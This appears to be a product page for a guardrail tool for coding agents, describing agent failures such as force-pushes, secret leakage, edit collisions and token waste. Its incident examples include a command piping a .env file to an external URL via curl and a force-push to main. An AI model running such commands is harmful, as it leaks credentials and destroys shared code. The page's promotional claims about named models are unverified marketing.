THE PROBLEM

Autonomous Coding Agents Create Unmanaged Enterprise Risk

Modern agents can build features and run tests independently. But when you give them shell execution and file write capabilities across mission-critical codebases, fatal incidents become inevitable.

Critical Incident

Accidental Repo & History Destruction

When asked to "tidy git history", models like Sonnet force-push rewritten trees directly to main, overwriting production code and wiping commit lineage.

Incident: git push --force origin main (Overwrote 142 team commits)
Data Exfiltration

Secret & Token Leakage

A routine prompt ("debug payment timeout") causes agents to inspect .env, id_rsa, or AWS config, sending plaintext production credentials to external model providers.

Incident: cat .env | curl -X POST https://api.external.com/log
Concurrency Failure

Multi-Agent Edit Collisions

When deploying multiple agents across the same repository, coarse file locks block collaboration, while no locking causes silent race conditions, corrupted ASTs, and git merge hell.

Incident: Agent-A overwrote Agent-B changes on line 210 of checkout.py
Budget Drain

Context Window & Token Waste

Agents waste up to 80% of token context running speculative ls, find, and whole-file reads before finding the 15 lines of code their prompt actually touches.

Measured: 254,392 bytes sent when only 54,200 bytes were needed.

Deterministic Guardrails & Shell Firewall

No Prompt Injection Bypass

Chronos analyzes Bash commands, pipes, heredocs, subshells, and file operations against 80+ threat rules. If an agent tries to read a .env file or push to main, Chronos denies it or prompts for human approval.

  • AST-level shell command inspection (detects encoded payload execution).
  • Automatic redaction of secret files (*.env*, id_rsa, keys).
  • Protects critical policies and CI workflows from agent modification.
deny | [Chronos] Bash command names secret file: .env [rule secret.env_read]

Sub-File AST Intent Locking

True Multi-Agent Parallelism

Traditional Git file locks force agents into serial bottlenecks. Chronos locks at the sub-file AST node level (individual functions, classes, and handlers), enabling dozens of agents to work in the same file without collisions.

  • Granular AST leases prevent merge collisions before diffs are generated.
  • Heartbeat leasing and automatic TTL expiry prevent permanent deadlocks.
  • Call-graph blast radius check flags downstream affected callers.
